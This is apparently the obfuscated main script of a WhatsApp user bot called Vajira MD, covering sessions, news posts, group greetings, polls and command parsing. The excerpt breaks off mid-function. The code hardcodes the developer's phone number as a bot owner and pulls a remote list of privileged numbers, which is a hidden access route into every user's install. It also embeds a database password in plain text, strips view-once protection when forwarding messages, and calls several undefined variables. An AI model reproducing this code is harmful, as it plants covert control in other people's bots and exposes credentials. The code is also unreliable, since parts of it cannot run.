const {
  default: makeWASocket,
  getAggregateVotesInPollMessage,
  useMultiFileAuthState,
  DisconnectReason,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  Browsers,
  delay,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto
} = require("@whiskeysockets/baileys");
const fs = require('fs');
const P = require("pino");
const FileType = require('file-type');
const moment = require('moment-timezone');
const l = console.log;
var config = require("./settings");
const NodeCache = require("node-cache");
const util = require("util");
const mongoose = require("mongoose");
const cheerio = require("cheerio");
var prefix = config.PREFIX;
var prefixRegex = config.PREFIX === "false" || config.PREFIX === "null" ? '^' : new RegExp('^[' + config.PREFIX + ']');
const {
  smsg,
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
  fetchBuffer,
  getFile
} = require('./lib/functions');
const {
  sms,
  downloadMediaMessage
} = require("./lib/msg");
var {
  updateCMDStore,
  isbtnID,
  getCMDStore,
  getCmdForCmdId,
  connectdb,
  input,
  get,
  updb,
  updfb
} = require("./lib/database");
var {
  get_set,
  input_set
} = require("./lib/set_db");
const axios = require("axios");
function genMsgId() {
  let _0x14b8c2 = '3EB';
  for (let _0xa28e79 = '3EB'.length; _0xa28e79 < 0x16; _0xa28e79++) {
    const _0x4a87c4 = Math.floor(Math.random() * "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".length);
    _0x14b8c2 += "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(_0x4a87c4);
  }
  return _0x14b8c2;
}
const {
  File
} = require("megajs");
const path = require('path');
const msgRetryCounterCache = new NodeCache();
const ownerNumber = config.OWNER_NUMBER;
const UserSchema = new mongoose.Schema({
  'id': {
    'type': String,
    'required': true,
    'unique': true
  },
  'newsid': {
    'type': String
  }
});
const news1 = mongoose.model("news1", UserSchema);
mongoose.connect('mongodb+srv://Jithula:Jithula@cluster0.i9f4p.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0').then(() => console.log("Connected Sucess!"));
if (!fs.existsSync(__dirname + '/lib/session/creds.json')) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace("VAJIRA-MD=", '');
    const filer = File.fromURL("https://mega.nz/file/" + sessdata);
    filer.download((_0x4fca30, _0xabab46) => {
      if (_0x4fca30) {
        throw _0x4fca30;
      }
      fs.writeFile(__dirname + "/lib/session/creds.json", _0xabab46, () => {
        console.log("Session download completed !!");
      });
    });
  }
}
const express = require('express');
const app = express();
const port = process.env.PORT || 0x1f40;
async function connectToWA() {
  const {
    version: _0x47f426,
    isLatest: _0xe2c94c
  } = await fetchLatestBaileysVersion();
  console.log("using WA v" + _0x47f426.join('.') + ", isLatest: " + _0xe2c94c);
  const {
    state: _0x31d03e,
    saveCreds: _0xee0997
  } = await useMultiFileAuthState(__dirname + "/lib//session/");
  const _0x5b4381 = makeWASocket({
    'logger': P({
      'level': "fatal"
    }).child({
      'level': "fatal"
    }),
    'printQRInTerminal': true,
    'generateHighQualityLinkPreview': true,
    'auth': _0x31d03e,
    'defaultQueryTimeoutMs': undefined,
    'msgRetryCounterCache': msgRetryCounterCache
  });
  _0x5b4381.ev.on('connection.update', async _0x45f34e => {
    const {
      connection: _0xf947b9,
      lastDisconnect: _0x1ff0a6
    } = _0x45f34e;
    if (_0xf947b9 === "close") {
      if (_0x1ff0a6.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else {
      if (_0xf947b9 === "open") {
        async function _0x560364() {
          const _0x173634 = await axios.get("https://www.hirunews.lk/local-news.php?pageID=1");
          const _0x4917bf = cheerio.load(_0x173634.data);
          const _0x1cad83 = _0x4917bf("div:nth-child(2) > div.column.middle > div.all-section-tittle").text().trim();
          const _0x65655c = _0x4917bf("div:nth-child(2) > div.column.left > div > a").attr("href");
          const _0x568c5c = _0x4917bf("div:nth-child(2) > div.column.middle > div.middle-tittle-time").text().trim();
          const _0x5b1b51 = _0x4917bf("img.middle-sm.img-fluid").attr('src');
          const _0x262ac8 = await axios.get(_0x65655c);
          const _0x2b1c3f = cheerio.load(_0x262ac8.data);
          const _0xa1c831 = _0x2b1c3f("#article-phara2").text().trim();
          const _0x5d28e6 = "乂  *HIRUNEWS BY VAJIRA MD*\n\n\n         ◦  *Title* : " + _0x1cad83 + "\n\n\t ◦  *Date* : " + _0x568c5c + "\n\n         ◦  *Desc* : " + _0xa1c831 + "\n\n         ◦  *ID* : " + _0x65655c + "\n\n";
          let _0x714268 = await news1.findOne({
            'id': "123"
          });
          if (!_0x714268) {
            await new news1({
              'id': '123',
              'newsid': _0x65655c,
              'events': "true"
            }).save();
            await _0x5b4381.sendMessage(config.N_JID, {
              'text': _0x5d28e6,
              'contextInfo': {
                'mentionedJid': [''],
                'groupMentions': [],
                'forwardingScore': 0x457,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "120363290448968237@newsletter",
                  'newsletterName': '',
                  'serverMessageId': 0x7f
                },
                'externalAdReply': {
                  'title': "TC TEAM BY VAJIRA",
                  'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
                  'mediaType': 0x1,
                  'sourceUrl': 'https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z',
                  'thumbnailUrl': _0x5b1b51,
                  'renderLargerThumbnail': true,
                  'showAdAttribution': false
                }
              }
            });
          } else {
            if (_0x714268.newsid == _0x65655c) {
              return;
            } else {
              await news1.updateOne({
                'id': '123'
              }, {
                'newsid': _0x65655c,
                'events': 'true'
              });
              await _0x5b4381.sendMessage(config.N_JID, {
                'text': _0x5d28e6,
                'contextInfo': {
                  'mentionedJid': [''],
                  'groupMentions': [],
                  'forwardingScore': 0x457,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': "120363290448968237@newsletter",
                    'newsletterName': '',
                    'serverMessageId': 0x7f
                  },
                  'externalAdReply': {
                    'title': "TC TEAM BY VAJIRA",
                    'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
                    'mediaType': 0x1,
                    'sourceUrl': 'https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z',
                    'thumbnailUrl': _0x5b1b51,
                    'renderLargerThumbnail': true,
                    'showAdAttribution': false
                  }
                }
              });
            }
          }
        }
        setInterval(_0x560364, 0x2710);
        console.log("Installing plugins 🔌... ");
        const _0x5b07a0 = require("path");
        fs.readdirSync("./plugins/").forEach(_0x53d69f => {
          if (_0x5b07a0.extname(_0x53d69f).toLowerCase() == ".js") {
            require("./plugins/" + _0x53d69f);
          }
        });
        console.log("Plugins installed ✅");
        console.log("Bot connected ✅");
        await _0x5b4381.sendMessage(config.OWNER_NUMBER + '@s.whatsapp.net', {
          'text': "*👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ 👨‍💻 successfully connected* ✓\n\n Use .Update command to see Vajira md new update news \n\n> ◦ *Official GitHub* - ```https://github.com/VajiraTech```\n> ◦ ᴊᴏɪɴ ᴏᴜʀ sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ ᴠɪᴀ ᴛʏᴘᴇ: .joinsup\n*👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ 👨‍💻 ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴄʀᴇᴀᴛᴇᴅ ʙʏ • ᴠᴀᴊɪʀᴀ ʀᴀᴛʜɴᴀʏᴀᴋᴀ*",
          'contextInfo': {
            'externalAdReply': {
              'title': "👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ 👨‍💻\nSuccessfully Connected !",
              'thumbnailUrl': "https://cdn.dribbble.com/users/15468/screenshots/2450252/logo.jpg",
              'sourceUrl': '',
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        });
      }
    }
  });
  _0x5b4381.ev.on("call", async _0x7e586f => {
    if (config.ANTI_CALL === "true") {
      for (const _0xcfd72c of _0x7e586f) {
        if (_0xcfd72c.status == "offer") {
          if (_0xcfd72c.isGroup == false) {
            await _0x5b4381.sendMessage(_0xcfd72c.from, {
              'text': "⚠️︱Call rejected automaticaly Because owner is busy right now\nහිමිකරු දැන් කාර්ය බහුල බැවින් ඇමතුම ස්වයංක්‍රීයව ප්‍රතික්ෂේප විය",
              'mentions': [_0xcfd72c.from]
            });
            await _0x5b4381.rejectCall(_0xcfd72c.id, _0xcfd72c.from);
          } else {
            await _0x5b4381.rejectCall(_0xcfd72c.id, _0xcfd72c.from);
          }
        }
      }
    }
  });
  _0x5b4381.forwardMessage = async (_0x601d77, _0x1b2f67, _0x4d4df8 = false, _0x300e87 = {}) => {
    let _0x17401c;
    if (_0x300e87.readViewOnce) {
      _0x1b2f67.message = _0x1b2f67.message && _0x1b2f67.message.ephemeralMessage && _0x1b2f67.message.ephemeralMessage.message ? _0x1b2f67.message.ephemeralMessage.message : _0x1b2f67.message || undefined;
      _0x17401c = Object.keys(_0x1b2f67.message.viewOnceMessage.message)[0x0];
      delete (_0x1b2f67.message && _0x1b2f67.message.ignore ? _0x1b2f67.message.ignore : _0x1b2f67.message || undefined);
      delete _0x1b2f67.message.viewOnceMessage.message[_0x17401c].viewOnce;
      _0x1b2f67.message = {
        ..._0x1b2f67.message.viewOnceMessage.message
      };
    }
    let _0x4afcff = Object.keys(_0x1b2f67.message)[0x0];
    let _0x3a07cf = await generateForwardMessageContent(_0x1b2f67, _0x4d4df8);
    let _0x5ba3b7 = Object.keys(_0x3a07cf)[0x0];
    let _0x311824 = {};
    if (_0x4afcff != 'conversation') {
      _0x311824 = _0x1b2f67.message[_0x4afcff].contextInfo;
    }
    _0x3a07cf[_0x5ba3b7].contextInfo = {
      ..._0x311824,
      ..._0x3a07cf[_0x5ba3b7].contextInfo
    };
    const _0xfca4c0 = await generateWAMessageFromContent(_0x601d77, _0x3a07cf, _0x300e87 ? {
      ..._0x3a07cf[_0x5ba3b7],
      ..._0x300e87,
      ...(_0x300e87.contextInfo ? {
        'contextInfo': {
          ..._0x3a07cf[_0x5ba3b7].contextInfo,
          ..._0x300e87.contextInfo
        }
      } : {})
    } : {});
    await _0x5b4381.relayMessage(_0x601d77, _0xfca4c0.message, {
      'messageId': _0xfca4c0.key.id
    });
    return _0xfca4c0;
  };
  _0x5b4381.ev.on("group-participants.update", async _0xaf1e9c => {
    if (config.WELCOME === 'true') {
      console.log(_0xaf1e9c);
      try {
        let _0x468b1f = await _0x5b4381.groupMetadata(_0xaf1e9c.id);
        let _0x239ad2 = _0xaf1e9c.participants;
        for (let _0x57e8eb of _0x239ad2) {
          try {
            ppuser = await _0x5b4381.profilePictureUrl(_0x57e8eb, "image");
          } catch (_0x5a8cbe) {
            ppuser = "https://telegra.ph/file/b11123c61f6b970118a46.jpg";
          }
          try {
            ppgroup = await _0x5b4381.profilePictureUrl(_0xaf1e9c.id, 'image');
          } catch (_0x5bb7ba) {
            ppgroup = "https://telegra.ph/file/b11123c61f6b970118a46.jpg";
          }
          memb = _0x468b1f.participants.length;
          connWlcm = await getBuffer(ppuser);
          connLft = await getBuffer(ppuser);
          if (_0xaf1e9c.action == "add") {
            const _0x12038a = moment.tz('Asia/Kolkata').format("HH:mm:ss");
            const _0x3e6d53 = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
            const _0xd74182 = _0x468b1f.participants.length;
            connbody = "┌─❖\n│「 𝗛𝗶 👋 」\n└┬❖ 「  @" + _0x57e8eb.split('@')[0x0] + "  」\n   │✑  𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 \n   │✑  " + _0x468b1f.subject + "\n   │✑  𝗠𝗲𝗺𝗯𝗲𝗿 : \n   │✑ " + _0xd74182 + "th\n   │✑  𝗝𝗼𝗶𝗻𝗲𝗱 : \n   │✑ " + _0x12038a + " " + _0x3e6d53 + "\n   └───────────────┈ ⳹\n   DESCRIPTION\n\n   OWNER NAME = Vajira Rathnayaka\n\n   TEAM = Technical Cybers (T.C)\n\n   JOIN MY WHATSAPP CHANNEL = https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z\n\n   SUBSCRIBE MY YT CHANNEL = https://youtube.com/@gamingewingyt6216?si=fTgQw094lJrXWQlg\n\n👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻\n\t\t\t    \n   ";
            _0x5b4381.sendMessage(_0xaf1e9c.id, {
              'text': connbody,
              'contextInfo': {
                'mentionedJid': [_0x57e8eb],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'renderLargerThumbnail': true,
                  'title': " 👨‍💻 ＶＡＪＩＲＡ ＭＤ 👨‍💻",
                  'body': '' + _0x468b1f.subject,
                  'containsAutoReply': true,
                  'mediaType': 0x1,
                  'thumbnail': connLft,
                  'sourceUrl': '' + ppuser
                }
              }
            });
          } else {
            if (_0xaf1e9c.action == 'remove') {
              const _0x5acc2b = moment.tz("Asia/Kolkata").format("HH:mm:ss");
              const _0x1c775d = moment.tz('Asia/Kolkata').format("DD/MM/YYYY");
              const _0x550f05 = _0x468b1f.participants.length;
              connbody = "┌─❖\n│「 𝗚𝗼𝗼𝗱𝗯𝘆𝗲 👋 」\n└┬❖ 「 @" + _0x57e8eb.split('@')[0x0] + "  」\n   │✑  𝗟𝗲𝗳𝘁 \n   │✑ " + _0x468b1f.subject + "\n   │✑  𝗠𝗲𝗺𝗯𝗲𝗿 : \n   │✑ " + _0x550f05 + "th\n   │✑  𝗧𝗶𝗺𝗲 : \n   │✑  " + _0x5acc2b + " " + _0x1c775d + "\n   └───────────────┈ ⳹\n   DESCRIPTION\n\n   OWNER NAME = Vajira Rathnayaka\n\n   TEAM = Technical Cybers (T.C)\n\n   JOIN MY WHATSAPP CHANNEL = https://whatsapp.com/channel/0029VahMZasD8SE5GRwzqn3Z\n\n   SUBSCRIBE MY YT CHANNEL = https://youtube.com/@gamingewingyt6216?si=fTgQw094lJrXWQlg\n\n👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴄ ᴛᴇᴀᴍ 👨‍💻\n\t\t\t    ";
              _0x5b4381.sendMessage(_0xaf1e9c.id, {
                'text': connbody,
                'contextInfo': {
                  'mentionedJid': [_0x57e8eb],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'renderLargerThumbnail': true,
                    'title': " 👨‍💻 ＶＡＪＩＲＡ ＭＤ 👨‍💻",
                    'body': '' + _0x468b1f.subject,
                    'containsAutoReply': true,
                    'mediaType': 0x1,
                    'thumbnail': connLft,
                    'sourceUrl': '' + ppuser
                  }
                }
              });
            }
          }
        }
      } catch (_0x197b63) {
        console.log(_0x197b63);
      }
    }
  });
  _0x5b4381.ev.on("group-participants.update", async _0x2aca90 => {
    if (config.ADMIN_EVENT === 'true') {
      console.log(_0x2aca90);
      try {
        let _0x39abc0 = _0x2aca90.participants;
        for (let _0x5c17cd of _0x39abc0) {
          try {
            ppuser = await _0x5b4381.profilePictureUrl(_0x5c17cd, "image");
          } catch (_0x2f24c3) {
            ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
          }
          try {
            ppgroup = await _0x5b4381.profilePictureUrl(_0x2aca90.id, 'image');
          } catch (_0x9dec7a) {
            ppgroup = 'https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60';
          }
          if (_0x2aca90.action == "promote") {
            xeonbody = " 𝗖𝗼𝗻𝗴𝗿𝗮𝘁𝘀🎉 @" + _0x5c17cd.split('@')[0x0] + ", you have been *promoted* to *admin* 🥳";
            _0x5b4381.sendMessage(_0x2aca90.id, {
              'text': xeonbody,
              'contextInfo': {
                'mentionedJid': [_0x5c17cd],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'containsAutoReply': true,
                  'title': "VAJIRA MD",
                  'body': "Vajira Rathnayaka",
                  'previewType': "PHOTO",
                  'thumbnailUrl': '',
                  'thumbnail': XeonWlcm,
                  'sourceUrl': '' + wagc
                }
              }
            });
          } else {
            if (_0x2aca90.action == "demote") {
              xeonbody = "𝗢𝗼𝗽𝘀‼️ @" + _0x5c17cd.split('@')[0x0] + ", you have been *demoted* from *admin* 😬";
              _0x5b4381.sendMessage(_0x2aca90.id, {
                'text': xeonbody,
                'contextInfo': {
                  'mentionedJid': [_0x5c17cd],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'containsAutoReply': true,
                    'title': "VAJIRA MD",
                    'body': "Vajira Rathnayaka",
                    'previewType': "PHOTO",
                    'thumbnailUrl': '',
                    'thumbnail': XeonLft,
                    'sourceUrl': '' + wagc
                  }
                }
              });
            }
          }
        }
      } catch (_0x3c2648) {
        console.log(_0x3c2648);
      }
    }
  });
  async function _0x57dcde(_0x4be476) {
    if (store) {
      const _0x3bc575 = await store.loadMessage(_0x4be476.remoteJid, _0x4be476.id);
      return _0x3bc575?.["message"];
    }
    return {
      'conversation': "Hai"
    };
  }
  _0x5b4381.ev.on("messages.update", async _0x31a357 => {
    for (const {
      key: _0x4fadaf,
      update: _0x3270e6
    } of _0x31a357) {
      if (_0x3270e6.pollUpdates && _0x4fadaf.fromMe) {
        const _0x1e4bfd = await _0x57dcde(_0x4fadaf);
        if (_0x1e4bfd) {
          const _0x14d32f = await getAggregateVotesInPollMessage({
            'message': _0x1e4bfd,
            'pollUpdates': _0x3270e6.pollUpdates
          });
          var _0x434bd3 = _0x14d32f.filter(_0x450d71 => _0x450d71.voters.length !== 0x0)[0x0]?.["name"];
          if (_0x434bd3 == undefined) {
            return;
          }
          var _0x8ba748 = prefix + _0x434bd3;
          try {
            setTimeout(async () => {
              await gss.sendMessage(_0x4fadaf.remoteJid, {
                'delete': _0x4fadaf
              });
            }, 0x2710);
          } catch (_0x521156) {
            console.error("Error deleting message:", _0x521156);
          }
          gss.appenTextMessage(_0x8ba748, _0x31a357);
        }
      }
    }
  });
  _0x5b4381.ev.on('messages.update', async _0x446a61 => {
    for (const {
      key: _0x5e01ae,
      update: _0x2caf96
    } of _0x446a61) {
      if (_0x2caf96.pollUpdates) {
        const _0x393073 = await _0x57dcde(_0x5e01ae);
        const _0x44c751 = _0x393073.message;
        if (_0x44c751) {
          const _0x2f815e = _0x5e01ae.remoteJid;
          const _0x4a9dd4 = await jidNormalizedUser(_0x5b4381.user.id);
          const _0x14ce74 = await getAggregateVotesInPollMessage({
            'message': _0x44c751,
            'pollUpdates': _0x2caf96.pollUpdates
          });
          let _0x35e6d1 = _0x14ce74.find(_0x30455a => _0x30455a.voters.length > 0x0)?.["name"] || '';
          let _0x16b138 = _0x14ce74.findIndex(_0x2f9b1d => _0x2f9b1d.name === _0x35e6d1) || '';
          let _0x1ece40 = _0x14ce74.find(_0x27c76f => _0x27c76f.voters.length > 0x0)?.["voters"][0x0] == 'me' ? _0x4a9dd4 : _0x14ce74.find(_0x37e5c7 => _0x37e5c7.voters.length > 0x0)?.["voters"][0x0];
          function _0x4e68d9(_0x2aac32) {
            let _0x22d264 = ["pollCreationMessage", "pollCreationMessageV1", 'pollCreationMessageV2', "pollCreationMessageV3"];
            for (let _0x2e0ae5 of _0x22d264) {
              if (_0x2aac32[_0x2e0ae5] && _0x2aac32[_0x2e0ae5].mentionedJid) {
                return _0x2aac32[_0x2e0ae5].mentionedJid;
              }
            }
            return null;
          }
          function _0x1e4a98(_0x57f5e1) {
            let _0x46e54e = ["pollCreationMessage", 'pollCreationMessageV1', 'pollCreationMessageV2', "pollCreationMessageV3"];
            for (let _0x22968f of _0x46e54e) {
              if (_0x57f5e1[_0x22968f] && _0x57f5e1[_0x22968f].name) {
                return _0x57f5e1[_0x22968f].name;
              }
            }
            return null;
          }
          const _0x4de453 = _0x4e68d9(_0x44c751);
          const _0x5e615f = _0x1e4a98(_0x44c751);
          const _0x3418a8 = _0x4de453?.["includes"](_0x1ece40);
          const _0x6bea82 = _0x393073.key.remoteJid.includes("@g.us") ? _0x393073.key.participant : _0x393073.key.remoteJid;
          const _0x36e623 = {
            'body': _0x16b138 + 0x1,
            'voted': _0x35e6d1,
            'from': _0x2f815e,
            'isRequester': _0x3418a8 ? _0x3418a8 : false,
            'mentionedJid': _0x4de453,
            'pollSender': _0x6bea82,
            'poll': _0x5e615f,
            'voter': _0x1ece40,
            'type': "poll"
          };
          await _0x5b4381.sendMessage(_0x4a9dd4, {
            'text': JSON.stringify(_0x36e623, null, 0x2)
          });
        }
      }
    }
  });
  _0x5b4381.ev.on("creds.update", _0xee0997);
  _0x5b4381.ev.on('messages.upsert', async _0x17deea => {
    try {
      _0x17deea = _0x17deea.messages[0x0];
      if (!_0x17deea.message) {
        return;
      }
      var _0x3145d7 = require("./lib/id_db");
      _0x17deea.message = getContentType(_0x17deea.message) === "ephemeralMessage" ? _0x17deea.message.ephemeralMessage.message : _0x17deea.message;
      if (config.AUTO_STATUS_READ === 'true') {
        if (_0x17deea.key && _0x17deea.key.remoteJid === "status@broadcast") {
          await _0x5b4381.readMessages([_0x17deea.key]);
        }
      }
      if (_0x17deea.key && _0x17deea.key.remoteJid === "status@broadcast") {
        return;
      }
      const _0x4c0316 = sms(_0x5b4381, _0x17deea);
      const _0x1fd59a = getContentType(_0x17deea.message);
      const _0x119ded = _0x17deea.key.remoteJid;
      const _0x2a7cf3 = _0x1fd59a == "extendedTextMessage" && _0x17deea.message.extendedTextMessage.contextInfo != null ? _0x17deea.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const _0xd6496a = _0x1fd59a === "conversation" ? _0x17deea.message.conversation : _0x1fd59a === "extendedTextMessage" ? _0x17deea.message.extendedTextMessage.text : _0x1fd59a == "interactiveResponseMessage" ? _0x17deea.message.interactiveResponseMessage && _0x17deea.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(_0x17deea.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(_0x17deea.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x1fd59a == "templateButtonReplyMessage" ? _0x17deea.message.templateButtonReplyMessage && _0x17deea.message.templateButtonReplyMessage.selectedId : _0x1fd59a === "extendedTextMessage" ? _0x17deea.message.extendedTextMessage.text : _0x1fd59a == "imageMessage" && _0x17deea.message.imageMessage.caption ? _0x17deea.message.imageMessage.caption : _0x1fd59a == "videoMessage" && _0x17deea.message.videoMessage.caption ? _0x17deea.message.videoMessage.caption : '';
      if ((await isbtnID(_0x17deea.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"])) && getCmdForCmdId(await getCMDStore(_0x17deea.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"]), _0x17deea?.["message"]?.['extendedTextMessage']?.["text"])) {
        getCmdForCmdId(await getCMDStore(_0x17deea.message?.["extendedTextMessage"]?.["contextInfo"]?.["stanzaId"]), _0x17deea?.['message']?.['extendedTextMessage']?.["text"]);
      } else if (_0x1fd59a === "extendedTextMessage") {
        _0x17deea.message.extendedTextMessage.text;
      } else if (_0x1fd59a == 'imageMessage' && _0x17deea.message.imageMessage.caption) {
        _0x17deea.message.imageMessage.caption;
      } else if (_0x1fd59a == "videoMessage" && _0x17deea.message.videoMessage.caption) {
        _0x17deea.message.videoMessage.caption;
      } else {
        '';
      }
      _0x5b4381.sendPoll = (_0x1f7d98, _0x501364 = '', _0x28471f = [], _0x27cd95 = 0x1) => {
        return _0x5b4381.sendMessage(_0x1f7d98, {
          'poll': {
            'name': _0x501364,
            'values': _0x28471f,
            'selectableCount': _0x27cd95
          }
        });
      };
      var _0x17cd56 = await get_set("all");
      config = await _0x1af558(config, _0x17cd56);
      prefix = config.PREFIX;
      var _0x3e8311 = _0xd6496a.startsWith(prefix);
      var _0x370df7 = _0x3e8311 ? _0xd6496a.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
      var _0xdef36d = _0xd6496a.trim().split(/ +/).slice(0x1);
      var _0x42475e = _0xdef36d.join(" ");
      if (_0x4c0316.quoted && _0x4c0316.quoted.fromMe && (await _0x3145d7.check(_0x4c0316.quoted.id))) {
        if (_0xd6496a.startsWith(prefix)) {
          _0xd6496a = _0xd6496a.replace(prefix, '');
        }
        var _0x39615b = await _0x3145d7.get_data(_0x4c0316.quoted.id, _0xd6496a);
        if (_0x39615b.cmd) {
          _0x3e8311 = true;
          _0x370df7 = _0x39615b.cmd.startsWith(prefix) ? _0x39615b.cmd.slice(prefix.length).trim().split(" ").shift().toLowerCase() : '';
          _0xdef36d = _0x39615b.cmd.trim().split(/ +/).slice(0x1);
          _0x42475e = _0xdef36d.join(" ");
        }
      }
      console.log(_0x370df7);
      const _0x16cdf1 = _0x119ded.endsWith("@g.us");
      const _0x425769 = _0x17deea.key.fromMe ? _0x5b4381.user.id.split(':')[0x0] + '@s.whatsapp.net' || _0x5b4381.user.id : _0x17deea.key.participant || _0x17deea.key.remoteJid;
      const _0x594863 = _0x425769.split('@')[0x0];
      const _0x4959e6 = _0x5b4381.user.id.split(':')[0x0];
      const _0x4b7296 = _0x17deea.pushName || "Sin Nombre";
      const _0x48cd40 = _0x4959e6.includes(_0x594863);
      const _0x137e4b = "94711453361".includes(_0x594863);
      let _0x34d752 = (await axios.get('https://gist.github.com/VajiraTech/8119fe9edcefd66c4d11a5c419874724/raw')).data;
      const _0x3f4181 = _0x34d752.split(',');
      const _0x2e9d54 = [..._0x3f4181].map(_0x419707 => _0x419707.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x425769);
      const _0x29fc12 = await jidNormalizedUser(_0x5b4381.user.id);
      const _0x25fcb1 = [_0x29fc12].map(_0x347175 => _0x347175.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x425769);
      const _0x506cfc = _0x48cd40 ? _0x48cd40 : _0x137e4b;
      const _0x2be52d = ownerNumber.includes(_0x594863) || _0x506cfc;
      const _0x2b0dec = _0x16cdf1 ? await _0x5b4381.groupMetadata(_0x119ded)["catch"](_0x4fbcc8 => {}) : '';
      const _0x11dc73 = _0x16cdf1 ? _0x2b0dec.subject : '';
      const _0x17aa30 = _0x16cdf1 ? await _0x2b0dec.participants : '';
      const _0x1e9b82 = _0x16cdf1 ? await getGroupAdmins(_0x17aa30) : '';
      const _0x4a4be7 = _0x16cdf1 ? _0x1e9b82.includes(_0x29fc12) : false;
      const _0x58f4d6 = _0x16cdf1 ? _0x1e9b82.includes(_0x425769) : false;
      const _0x45a247 = _0x70ff48 => {
        for (let _0x4b41e8 = 0x0; _0x4b41e8 < _0x70ff48.length; _0x4b41e8++) {
          if (_0x70ff48[_0x4b41e8] === _0x119ded) {
            return true;
          }
        }
        return false;
      };
      const _0x267ddb = async _0x353ef6 => {
        return await _0x5b4381.sendMessage(_0x119ded, {
          'text': _0x353ef6
        }, {
          'quoted': _0x17deea
        });
      };
      function _0x1af558(_0x1f62c0, _0x34e054) {
        for (var _0x2d1978 in _0x34e054) {
          _0x1f62c0[_0x2d1978] = _0x34e054[_0x2d1978];
        }
        return _0x1f62c0;
      }
      var _0x17cd56 = await get_set("all");
      config = await _0x1af558(config, _0x17cd56);
      _0x5b4381.replyad = async _0x314e9d => {
        return await _0x5b4381.sendMessage(_0x119ded, {
          'text': _0x314e9d,
          'contextInfo': {
            'mentionedJid': [''],
            'groupMentions': [],
            'forwardingScore': 0x1,
            'isForwarded': true,
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "120363290448968237@newsletter",
              'serverMessageId': 0x7f
            },
            'externalAdReply': {
              'title': "👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻",
              'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
              'mediaType': 0x1,
              'sourceUrl': "https://wa.me/94711453361",
              'thumbnailUrl': 'https://pomf2.lain.la/f/opmjwj3s.jpg',
              'renderLargerThumbnail': false,
              'showAdAttribution': true
            }
          }
        }, {
          'quoted': _0x17deea
        });
      };
      _0x5b4381.buttonMessage2 = async (_0x1a7598, _0x3d19d7, _0x3cfae7) => {
        let _0xa3bb8a = '';
        const _0x25ad6a = [];
        _0x3d19d7.buttons.forEach((_0xa4934a, _0x500069) => {
          const _0x1c3fb7 = '' + (_0x500069 + 0x1);
          _0xa3bb8a += "\n" + _0x1c3fb7 + " | " + _0xa4934a.buttonText.displayText + "\n";
          _0x25ad6a.push({
            'cmdId': _0x1c3fb7,
            'cmd': _0xa4934a.buttonId
          });
        });
        if (_0x3d19d7.headerType === 0x1) {
          const _0x2909d5 = _0x3d19d7.text + "\n\n🔢 Reply you want number," + _0xa3bb8a + "\n" + _0x3d19d7.footer;
          const _0x29c4b5 = await _0x5b4381.sendMessage(_0x119ded, {
            'text': _0x2909d5,
            'contextInfo': {
              'mentionedJid': [''],
              'groupMentions': [],
              'forwardingScore': 0x1,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363290448968237@newsletter",
                'serverMessageId': 0x7f
              },
              'externalAdReply': {
                'title': "👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻",
                'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
                'mediaType': 0x1,
                'sourceUrl': "https://wa.me/94711453361",
                'thumbnailUrl': "https://pomf2.lain.la/f/opmjwj3s.jpg",
                'renderLargerThumbnail': false,
                'showAdAttribution': true
              }
            }
          }, {
            'quoted': _0x3cfae7 || _0x17deea
          });
